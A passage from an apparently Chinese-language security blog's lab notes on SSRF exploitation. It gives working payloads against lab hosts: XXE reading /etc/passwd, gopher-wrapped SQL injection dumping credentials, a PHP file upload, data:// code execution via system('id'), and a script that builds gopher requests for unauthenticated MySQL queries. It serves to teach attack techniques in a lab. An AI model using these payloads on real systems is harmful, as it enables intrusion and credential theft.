class="hljs-name">password</span>&gt;</span>passwd<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></span><br></code></pre></td></tr></table></figure>

<p>然后用bp抓包修改，gopher伪协议访问抓包</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">gopher:</span><span class="hljs-comment">//172.250.250.6:80/_</span><br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250509205535253.png" srcset="/img/loading.gif" lazyload alt="image-20250509205535253"></p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250509205548841.png" srcset="/img/loading.gif" lazyload alt="image-20250509205548841"></p>
<p>放入重放器，将刚才的payload放入进行两次url编码</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250509213551266.png" srcset="/img/loading.gif" lazyload alt="image-20250509213551266"></p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250509213728608.png" srcset="/img/loading.gif" lazyload alt="image-20250509213728608"></p>
<p>得到的响应也是xml格式的</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">result</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">msg</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">msg</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>看源代码中的这部分</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250509210529088.png" srcset="/img/loading.gif" lazyload alt="image-20250509210529088"></p>
<p>这里响应的code为0，说明登录失败了，然后会显示msg是用户名为admin，注意这里会回显用户名的，可以用来回显文件内容</p>
<p>实验结束，然后就可以构造一个进行任意文件读取的payload了</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/doLogin.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.250.250.6<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/xml;charset=utf-8<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>131<br><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span> [<span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">benben</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;benben;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>passwd<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></span><br></code></pre></td></tr></table></figure>

<ul>
<li>这里就是定义了一个实体<code>benben</code>，引入了外部实体<code>SYSTEM</code>，这个外部实体指向的文件路径是<code>file:///etc/passwd</code>，就相当于现在<code>benben</code>代表的是<code>/etc/passwd</code>这个文件</li>
<li>然后在填写用户名的地方填写<code>&amp;benben;</code>引用<code>benben</code>实体，因为刚才实验可知会返回用户名的内容，所以这里会回显<code>/etc/passwd</code>的文件内容，实现了任意文件读取</li>
</ul>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250509214128766.png" srcset="/img/loading.gif" lazyload alt="image-20250509214128766"></p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250509214203895.png" srcset="/img/loading.gif" lazyload alt="image-20250509214203895"></p>
<h3 id="使用SSRF进行SQL注入"><a href="#使用SSRF进行SQL注入" class="headerlink" title="使用SSRF进行SQL注入"></a>使用SSRF进行SQL注入</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.250.250.11/</span><br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423182926236.png" srcset="/img/loading.gif" lazyload alt="image-20250423182926236"></p>
<h4 id="SQL注入语句"><a href="#SQL注入语句" class="headerlink" title="SQL注入语句"></a>SQL注入语句</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 查询列数</span><br>/?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27;%20group%20by%203--%20</span><br><span class="hljs-string"># 查询回显位</span><br><span class="hljs-string">/?id=-1&#x27;</span>%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>--%<span class="hljs-number">20</span><br><span class="hljs-comment"># 查询数据库名</span><br>/?id=-<span class="hljs-number">1</span><span class="hljs-string">&#x27;%20union%20select%201,2,database()--%20</span><br><span class="hljs-string"># 查询表名</span><br><span class="hljs-string">/?id=-1&#x27;</span>%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-title function_ invoke__">group_concat</span>(table_name)%<span class="hljs-number">20</span><span class="hljs-keyword">from</span>%<span class="hljs-number">20</span>information_schema.tables%<span class="hljs-number">20</span>where%<span class="hljs-number">20</span>table_schema=<span class="hljs-title function_ invoke__">database</span>()--%<span class="hljs-number">20</span><br><span class="hljs-comment"># 查询列名</span><br>/?id=-<span class="hljs-number">1</span><span class="hljs-string">&#x27;%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=&#x27;</span>users<span class="hljs-string">&#x27;%20and%20table_schema=database()--%20</span><br><span class="hljs-string"># 查询数据</span><br><span class="hljs-string">/?id=-1&#x27;</span>%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-title function_ invoke__">group_concat</span>(username,<span class="hljs-string">&#x27;-&#x27;</span>,password)%<span class="hljs-number">20</span><span class="hljs-keyword">from</span>%<span class="hljs-number">20</span>users--%<span class="hljs-number">20</span><br></code></pre></td></tr></table></figure>

<h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><ul>
<li><strong>所有空格的地方都要用<code>+</code>或<code>%20</code>表示</strong></li>
</ul>
<p>直接填写空格会报错</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.250.250.11</span>/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27; --+<br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423185549061.png" srcset="/img/loading.gif" lazyload alt="image-20250423185549061"></p>
<p>可以使用<code>+</code>替换</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.250.250.11</span>/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27;+--+<br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423185608042.png" srcset="/img/loading.gif" lazyload alt="image-20250423185608042"></p>
<p>可以使用<code>%20</code>替换</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.250.250.11</span>/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">20</span>--%<span class="hljs-number">20</span><br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423185017524.png" srcset="/img/loading.gif" lazyload alt="image-20250423185017524"></p>
<p>也可以两个混合使用</p>
<ul>
<li><strong>用<code>HackBar</code>进行提交要把所有的空格进行两次URL编码为<code>%25%20</code>，或者直接使用<code>+</code></strong></li>
</ul>
<p>只进行一次URL编码会报错</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.250.250.11</span>/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">20</span>group%<span class="hljs-number">20</span>by%<span class="hljs-number">203</span>--%<span class="hljs-number">20</span><br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423190639575.png" srcset="/img/loading.gif" lazyload alt="image-20250423190639575"></p>
<p>要进行两次URL编码</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.250.250.11</span>/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">2520</span>group%<span class="hljs-number">2520</span>by%<span class="hljs-number">25203</span>--%<span class="hljs-number">2520</span><br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423191100481.png" srcset="/img/loading.gif" lazyload alt="image-20250423191100481"></p>
<p>或者直接全部使用<code>+</code></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.250.250.11</span>/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27;+group+by+<span class="hljs-number">3</span>--+<br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423191158425.png" srcset="/img/loading.gif" lazyload alt="image-20250423191158425"></p>
<h4 id="要用POST提交进行SQL注入"><a href="#要用POST提交进行SQL注入" class="headerlink" title="要用POST提交进行SQL注入"></a>要用POST提交进行SQL注入</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.250.250.11</span>/Less-<span class="hljs-number">11</span>/<br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423191605610.png" srcset="/img/loading.gif" lazyload alt="image-20250423191605610"></p>
<p>查看源代码，可以看要用POST提交三个参数</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423191758724.png" srcset="/img/loading.gif" lazyload alt="image-20250423191758724"></p>
<p>SSRF里POST提交就要使用<code>gopher</code>伪协议</p>
<p>可以进行一次抓包，构造出POC</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gopher</span>://<span class="hljs-number">172.250.250.11:80</span>/_POST /Less-<span class="hljs-number">11</span>/index.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">172.250.250.11</span><br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">53</span><br><br><span class="hljs-attribute">uname</span>=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span> #&amp;passwd=<span class="hljs-number">123</span>&amp;submit=Submit<br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423193017235.png" srcset="/img/loading.gif" lazyload alt="image-20250423193017235"></p>
<p>进行两次URL编码</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423193135040.png" srcset="/img/loading.gif" lazyload alt="image-20250423193135040"></p>
<h3 id="使用SSRF进行文件上传"><a href="#使用SSRF进行文件上传" class="headerlink" title="使用SSRF进行文件上传"></a>使用SSRF进行文件上传</h3><h4 id="multipart-form-data的定义"><a href="#multipart-form-data的定义" class="headerlink" title="multipart/form-data的定义"></a><code>multipart/form-data</code>的定义</h4><p><code>multipart/form-data</code>是在 HTTP 协议里用于表单数据提交的一种编码方式，这个数据体由多个部分组成，每个部分被一个固定边界值分隔</p>
<p><strong>简单的说就是一个分隔符，将POST多个提交内容使用分界线拼接起来</strong></p>
<p>如下是进行一次文件上传的抓包</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423194434594.png" srcset="/img/loading.gif" lazyload alt="image-20250423194434594"></p>
<h4 id="构造payload-1"><a href="#构造payload-1" class="headerlink" title="构造payload"></a>构造payload</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.250.250.14</span>/Pass-<span class="hljs-number">01</span>/index.php<br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423194302965.png" srcset="/img/loading.gif" lazyload alt="image-20250423194302965"></p>
<p>查看源代码，寻找之后要构造的payload的部分</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423194737386.png" srcset="/img/loading.gif" lazyload alt="image-20250423194737386"></p>
<p>首先定义分界线，这是必需的，其中的<code>boundary</code>的值可以随便定义，这里使用<code>$&#123;Boundary&#125;</code>作为分界线</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-type">Content</span>-<span class="hljs-type">Type</span>: multipart/form-<span class="hljs-class"><span class="hljs-keyword">data</span>; boundary=$&#123;<span class="hljs-type">Boundary</span>&#125;</span><br></code></pre></td></tr></table></figure>

<p>使用分界线，要在定义好的分界线前要加上两个减号</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-comment">--$&#123;Boundary&#125;</span><br></code></pre></td></tr></table></figure>

<p>根据源码进行编写提交的内容，首先是上传的文件与文件内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;upload_file&quot;</span>; filename=<span class="hljs-string">&quot;phpinfo.php&quot;</span><br>Content-Type: image/jpeg<br><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>然后使用分界线分隔开</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-comment">--$&#123;Boundary&#125;</span><br></code></pre></td></tr></table></figure>

<p>接着继续根据源码编写另一个POST提交的内容submit，这部分可省略</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">Content-Disposition:</span> form-data; <span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;submit&quot;</span><br><span class="hljs-params">Content-Type:</span> text<span class="hljs-symbol">/plain</span>;<span class="hljs-attr">charset</span><span class="hljs-operator">=</span>UTF-<span class="hljs-number">8</span><br><br>上传<br></code></pre></td></tr></table></figure>

<p>最后再使用一次分界线，并且最后加上俩减号</p>
<figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-literal">--</span><span class="hljs-comment">$&#123;Boundary&#125;</span><span class="hljs-literal">--</span><br></code></pre></td></tr></table></figure>

<p>完整的payload为</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-type">Content</span>-<span class="hljs-type">Type</span>: multipart/form-<span class="hljs-class"><span class="hljs-keyword">data</span>; boundary=$&#123;<span class="hljs-type">Boundary</span>&#125;</span><br><br>--$&#123;<span class="hljs-type">Boundary</span>&#125;<span class="hljs-comment">--</span><br><span class="hljs-type">Content</span>-<span class="hljs-type">Disposition</span>: form-<span class="hljs-class"><span class="hljs-keyword">data</span>; name=&quot;upload_file&quot;; filename=&quot;phpinfo.php&quot;</span><br><span class="hljs-type">Content</span>-<span class="hljs-type">Type</span>: image/jpeg<br><br>&lt;?php phpinfo();?&gt;<br><br>--$&#123;<span class="hljs-type">Boundary</span>&#125;<span class="hljs-comment">--</span><br><span class="hljs-type">Content</span>-<span class="hljs-type">Disposition</span>: form-<span class="hljs-class"><span class="hljs-keyword">data</span>; name=&quot;submit&quot;</span><br><span class="hljs-type">Content</span>-<span class="hljs-type">Type</span>: text/plain;charset=<span class="hljs-type">UTF</span>-<span class="hljs-number">8</span><br><br>上传<br>--$&#123;<span class="hljs-type">Boundary</span>&#125;<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>

<h4 id="构造出完整的gopher提交数据"><a href="#构造出完整的gopher提交数据" class="headerlink" title="构造出完整的gopher提交数据"></a>构造出完整的<code>gopher</code>提交数据</h4><p>可以通过抓包获取数据进行构造</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/Pass-01/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.250.250.14<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryy0nfsJQPiWB4Y9qs<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>306<br><br><span class="language-php">------WebKitFormBoundarysogmETe5AIRzminC</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;upload_file&quot;</span>; filename=<span class="hljs-string">&quot;phpinfo.php&quot;</span></span><br><span class="language-php">Content-Type: image/jpeg</span><br><span class="language-php"></span><br><span class="language-php"> <span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><br><span class="language-php">------WebKitFormBoundarysogmETe5AIRzminC</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;submit&quot;</span></span><br><span class="language-php"></span><br><span class="language-php">上传</span><br><span class="language-php">------WebKitFormBoundarysogmETe5AIRzminC--</span><br></code></pre></td></tr></table></figure>

<p>使用<code>gopher</code>伪协议进行上传</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423201834987.png" srcset="/img/loading.gif" lazyload alt="image-20250423201834987"></p>
<p>进行两次URL编码后提交，会得到文件路径（上面的那个payload不知道为什么传之后得不到文件路径，这直接用的视频里的）</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423204852849.png" srcset="/img/loading.gif" lazyload alt="image-20250423204852849"></p>
<p>最后可以使用<code>http</code>伪协议查看上传的文件</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">172.250</span>.<span class="hljs-number">250.14</span><span class="hljs-regexp">/upload/</span>phpinfo.php<br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423205317234.png" srcset="/img/loading.gif" lazyload alt="image-20250423205317234"></p>
<h3 id="使用SSRF进行文件包含"><a href="#使用SSRF进行文件包含" class="headerlink" title="使用SSRF进行文件包含"></a>使用SSRF进行文件包含</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.250.250.14/include.php</span><br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423211557880.png" srcset="/img/loading.gif" lazyload alt="image-20250423211557880"></p>
<h4 id="直接使用伪协议包含读取文件"><a href="#直接使用伪协议包含读取文件" class="headerlink" title="直接使用伪协议包含读取文件"></a>直接使用伪协议包含读取文件</h4><p>可以直接提交一个参数就能读取文件</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span>://<span class="hljs-number">172.250</span><span class="hljs-number">.250</span><span class="hljs-number">.14</span>/<span class="hljs-built_in">include</span>.php?<span class="hljs-built_in">file</span>=<span class="hljs-built_in">file</span>:<span class="hljs-comment">///etc/passwd</span><br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423211807854.png" srcset="/img/loading.gif" lazyload alt="image-20250423211807854"></p>
<p>如果使用<code>data://</code>这种伪协议，含有空格的要使用URL编码，或者使用<code>+</code></p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">http://172.250.250.14/include.php?file=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span>%<span class="hljs-number">20</span>system(<span class="hljs-string">&#x27;id&#x27;</span>);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423212036497.png" srcset="/img/loading.gif" lazyload alt="image-20250423212036497"></p>
<p>如果是POST提交的参数，就和前面的漏洞利用一样使用<code>gopher</code>伪协议</p>
<h2 id="SSRF之对MySQL进行未授权操作"><a href="#SSRF之对MySQL进行未授权操作" class="headerlink" title="SSRF之对MySQL进行未授权操作"></a>SSRF之对MySQL进行未授权操作</h2><h3 id="使用SSRF对MySQL进行未授权查询"><a href="#使用SSRF对MySQL进行未授权查询" class="headerlink" title="使用SSRF对MySQL进行未授权查询"></a>使用SSRF对MySQL进行未授权查询</h3><p>这里的未授权是MySQL的数据库没有设置密码，并且允许用户登录数据库</p>
<h4 id="如何与MySQL进行数据通讯"><a href="#如何与MySQL进行数据通讯" class="headerlink" title="如何与MySQL进行数据通讯"></a>如何与MySQL进行数据通讯</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql <span class="hljs-operator">-</span>uroot		进入MySQL<br><span class="hljs-keyword">show</span> databases;		查看数据库<br></code></pre></td></tr></table></figure>

<p>通过SSRF查看数据库<code>security</code>下表<code>user</code>的内容</p>
<h4 id="抓取本地MySQL数据库通讯内容构造payload"><a href="#抓取本地MySQL数据库通讯内容构造payload" class="headerlink" title="抓取本地MySQL数据库通讯内容构造payload"></a>抓取本地MySQL数据库通讯内容构造payload</h4><p><strong>工具：</strong><code>tcpdump</code>、<code>Wireshark</code></p>
<p>也可以直接只用<code>Wireshark</code>抓取数据包并进行十六进制展示，再编程URL编码进行提交</p>
<ul>
<li>开始抓包，监听 lo 回环地址接口网卡的3306端口，-w写入文件<code>mysql.pcapng</code>生成在根目录下</li>
</ul>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tcpdump</span> -i lo port <span class="hljs-number">3306</span> -w mysql.pcapng<br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423224515084.png" srcset="/img/loading.gif" lazyload alt="image-20250423224515084"></p>
<ul>
<li>写入指令</li>
</ul>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">mysql -h127.0.0.1 -uroot <span class="hljs-attribute">--ssl-mode</span>=DISABLED -e <span class="hljs-string">&quot;show databases;&quot;</span><br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423224444109.png" srcset="/img/loading.gif" lazyload alt="image-20250423224444109"></p>
<p>然后就可以停止监听，并且可以在根目录看到<code>mysql.pcapng</code>文件</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423224639293.png" srcset="/img/loading.gif" lazyload alt="image-20250423224639293"></p>
<p>把文件复制到本地，用Wireshark打开，找到三次TCP握手，右键&#x3D;》跟踪流&#x3D;》TCP流</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423224913559.png" srcset="/img/loading.gif" lazyload alt="image-20250423224913559"></p>
<p>会得到以下数据流，红色的是自己主机发给MySQL服务器的数据流，蓝色的是接收的</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423225102697.png" srcset="/img/loading.gif" lazyload alt="image-20250423225102697"></p>
<p>构造POC的只需要红色部分的，所以要进行过滤</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423225255357.png" srcset="/img/loading.gif" lazyload alt="image-20250423225255357"></p>
<p>还要改成原始数据</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423225332934.png" srcset="/img/loading.gif" lazyload alt="image-20250423225332934"></p>
<p>最后得到的就是要使用的构造POC的内容</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423225410894.png" srcset="/img/loading.gif" lazyload alt="image-20250423225410894"></p>
<p>对以上数据还要进行一些修改，要去掉换行符，还要将ASCII码转化为URL编码</p>
<p>ASCII码转化为URL编码的脚本如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">results</span>(<span class="hljs-params">s</span>):<br>    a=[s[i:i+<span class="hljs-number">2</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(s),<span class="hljs-number">2</span>)]<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;curl gopher://172.250.250.1:3306/_%&quot;</span>+<span class="hljs-string">&quot;%&quot;</span>.join(a)<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    s=sys.argv[<span class="hljs-number">1</span>]<br>    <span class="hljs-built_in">print</span>(results(s))<br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423225852400.png" srcset="/img/loading.gif" lazyload alt="image-20250423225852400"></p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423230019375.png" srcset="/img/loading.gif" lazyload alt="image-20250423230019375"></p>
<p>将得到的payload在SSRF服务器提交，就可以获得数据库查询结果</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423230118363.png" srcset="/img/loading.gif" lazyload alt="image-20250423230118363"></p>
<h4 id="使用工具构造payload"><a href="#使用工具构造payload" class="headerlink" title="使用工具构造payload"></a>使用工具构造payload</h4><p>拉取工具</p>
